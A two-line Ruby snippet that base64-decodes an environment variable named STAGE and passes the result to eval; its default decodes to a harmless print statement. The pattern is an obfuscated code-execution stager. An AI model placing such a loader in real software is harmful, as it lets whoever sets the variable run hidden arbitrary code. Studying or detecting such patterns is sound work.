require "base64"
eval(Base64.decode64(ENV.fetch("STAGE", "cHV0cyAx")))
